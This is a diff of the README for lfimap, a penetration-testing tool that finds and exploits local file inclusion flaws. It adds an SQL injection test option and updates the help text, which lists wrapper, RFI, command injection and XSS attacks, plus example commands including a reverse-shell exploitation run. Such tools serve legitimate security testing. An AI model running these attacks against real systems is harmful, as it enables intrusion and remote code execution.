@@ -10,6 +10,7 @@
 - Remote file inclusion for code execution
 - Path truncation for arbitrary file inclusion
 - Command injection for remote command execution
+- Generic blind and union based sql injection testing
 - Reflected XSS testing
 - Option to test POST arguments
 - Option to specify custom http headers
@@ -22,11 +23,11 @@
 - [Usage](https://github.com/hansmach1ne/lfimap/wiki)
 
 ### -h, --help
-```
+```                  
 
-usage: lfimap.py [-U [url]] [-F [urlfile]] [-C <cookie>] [-D <request>] [-H <header>] [-P <proxy>] [--useragent <agent>] 
-                 [--referer <referer>] [--param <name>] [--no-stop] [-f] [-i] [-d] [-e] [-t] [-r] [-c] [--file] [--xss] 
-                 [--info] [-a] [-x] [--lhost <lhost>] [--lport <lport>] [-wT <path>] [-wX <path>] [-wC <path>] [-v] [-h]
+usage: lfimap.py [-U [url]] [-F [urlfile]] [-C <cookie>] [-D <request>] [-H <header>] [-P <proxy>] [--useragent <agent>]
+                 [--referer <referer>] [--param <name>] [--no-stop] [-f] [-i] [-d] [-e] [-t] [-r] [-c] [--file] [--xss] [--sqli]
+                 [--info] [-a] [-x] [--lhost <lhost>] [--lport <lport>] [-wT <path>] [-wC <path>] [-v] [-h]
 
 lfimap, Local File Inclusion discovery and exploitation tool
 
@@ -43,33 +44,33 @@ GENERAL OPTIONS:
   --referer <referer>            Specify HTTP referer
   --param <name>                 Specify different test parameter value
   --no-stop                      Don't stop using same method upon findings
-
-ATTACK TECHNIQUE:
-  -f, --filter                   Attack using filter:// wrapper
-  -i, --input                    Attack using input:// wrapper
-  -d, --data                     Attack using data:// wrapper
-  -e, --expect                   Attack using expect:// wrapper
-  -t, --trunc                    Attack using path truncation with wordlist (default "short.txt")
-  -r, --rfi                      Attack using remote file inclusion
-  -c, --cmd                      Attack using command injection
-  --file                         Attack using file:// wrapper
-  --xss                          Test for reflected XSS
-  --info                         Test for basic information disclosures
-  -a, --all                      Use all available methods to attack
-
-PAYLOAD OPTIONS:
+                                                                                                   
+ATTACK TECHNIQUE:                                                                                  
+  -f, --filter                   Attack using filter:// wrapper                                    
+  -i, --input                    Attack using input:// wrapper                                     
+  -d, --data                     Attack using data:// wrapper                                      
+  -e, --expect                   Attack using expect:// wrapper                                    
+  -t, --trunc                    Attack using path truncation with wordlist (default "short.txt")  
+  -r, --rfi                      Attack using remote file inclusion                                
+  -c, --cmd                      Attack using command injection                                    
+  --file                         Attack using file:// wrapper                                      
+  --xss                          Test for reflected XSS                                            
+  --sqli                         Test for SQL injection                                            
+  --info                         Test for basic information disclosures                            
+  -a, --all                      Use all available methods to attack                               
+                                                                                                   
+PAYLOAD OPTIONS:                                                                                   
   -x, --exploit                  Exploit to reverse shell if possible (Setup reverse listener first)
-  --lhost <lhost>                Specify local ip address for reverse connection
-  --lport <lport>                Specify local port number for reverse connection
+  --lhost <lhost>                Specify local ip address for reverse connection                   
+  --lport <lport>                Specify local port number for reverse connection                  
 
 WORDLIST OPTIONS:
   -wT <path>                     Specify wordlist for truncation test
-  -wX <path>                     Specify wordlist for xss test
   -wC <path>                     Specify wordlist for command injection test
 
 OTHER:
   -v, --verbose                  Print more detailed output when performing attacks
-  -h, --help                     Print this help message                   
+  -h, --help                     Print this help message
 
 ```
 ### Examples 
@@ -77,20 +78,20 @@ OTHER:
 #### 1) All attacks with '-a' (filter, input, data, expect and file wrappers, remote file inclusion, command injection, XSS, error disclosure).
 `python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a`  
 
-![1](https://user-images.githubusercontent.com/57464251/175751020-1528a8a6-acd5-4bb9-933c-31145c06df89.png)
+![Lfimap-1](https://user-images.githubusercontent.com/57464251/186299395-c6a91666-0e95-484e-8537-6f248d257f5b.png)
 
 
 #### 2) Reverse shell command execution attack with '-x'
 `python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a --lhost IP --lport PORT -x`  
 
-![2](https://user-images.githubusercontent.com/57464251/175751030-c35ee579-b91e-4e42-85b1-56e97b00d768.png)
+![Lfimap-2](https://user-images.githubusercontent.com/57464251/186299661-7d6b480b-953f-4a7e-a806-5f39435f07fd.png)
 
 
 #### 3) Post argument testing with '-D'
 
 `python3 lfimap.py -U "http://IP/index.php" -D "page=PWN" -a`
 
-![3](https://user-images.githubusercontent.com/57464251/175751045-8f0faac8-75b1-44ce-a41a-f3f6a4076669.png)
+![Lfimap-3](https://user-images.githubusercontent.com/57464251/186302047-0a2e9ab9-e4f0-43bb-b245-0235b6950ea0.png)
 
 
 If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it. <br>
